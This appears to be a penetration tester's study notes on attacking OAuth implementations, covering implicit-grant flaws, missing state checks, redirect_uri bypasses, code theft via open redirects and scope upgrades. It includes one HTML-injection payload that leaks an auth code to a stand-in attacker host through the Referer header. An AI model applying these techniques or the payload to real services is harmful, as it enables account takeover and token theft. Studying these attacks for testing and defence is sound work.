## Exploiting Vulnerabilities
OAuth Client App Vulnerabilities

Improper implementation of implicit grant type
• tokens are sent via the browser (grant type is designed for single page apps)
• userID and token value stored somewhere to maintain the session.
• POST request to have token associated with user (without a password, implicit trust)

Flawed CSRF Protection
• state param should contain unguessable value (hash tied to user)
   ◇ sort of like a csrf token

OAuth Service Vulnerabilities

Leaking Auth codes/access tokens
• OAuth services reknowned for leaking it's own cookies via config settings
• Access victims data / compromise their account / log in as victim 
• Dependent on grant type
• code/token set via call to /callback endpoint specified in redirect_uri
• IF Oauth doesn't validate, could construct CSRF (tricky victim browser into initiating OAuth flow)
• Steal the code before it is used, send code to /callback endpoint to get access to account
   ◇ Don't need to know client secret/access token if you have account access
• Using state or nonce potection doesn't prevent attacks.

Flawed redirect_uri validation
• Clients should provide an allowlist of genuine callback URI's (for validation)
• Still ways to bypass (play around with redirect_uri to understand its behaviour)
   ◇ maybe it only validates start/end of the input URI
   ◇ try adding multiple with & (SSRF and CORS)
   ◇ duplicate redirect_uri parameters (maybe it only looks at first/second?)
   ◇ maybe localhost is permitted? register domain name localhost.badstuff.com.au

Stealing codes / access tokens via proxy page
• Try and get redirect_uri to point to other pages on allowlisted domain. 
   ◇ Access those domains and play around with that.
• Dir Traversal to the end of valid URI's?
• Look for open redirects.
   ◇ Use this as a proxy to forward victims (with code/token) to your controlled domain
• Dangerous JS that handles query params / URL Fragments
• XSS Vulnerabilities
• HTML injection vulnerabilities
   ◇ Leak code via referer header: <img src="evil-user.net"> (might send full URL in referer header of request)

Flawed scope validation
• User must always approve the requested access based on scope definted in auth request
• Token should only alow access to data in that scope approved.
• Can an attacker upgrade a token?
• Dependent on grant type:
• Scope Upgrade: Auth Code Flow
   ◇ Can't manipulate directly
   ◇ register own client with OAuth service
• Scope Upgrade: implicit flow
   ◇ manually add new scope param with stolen access token
   ◇ OAuth service should validate scope value, doesn't always happen

Unverified user registration
• Implicit assumption that OAuth data is correct
• Can be issues on the OAuth providers side.



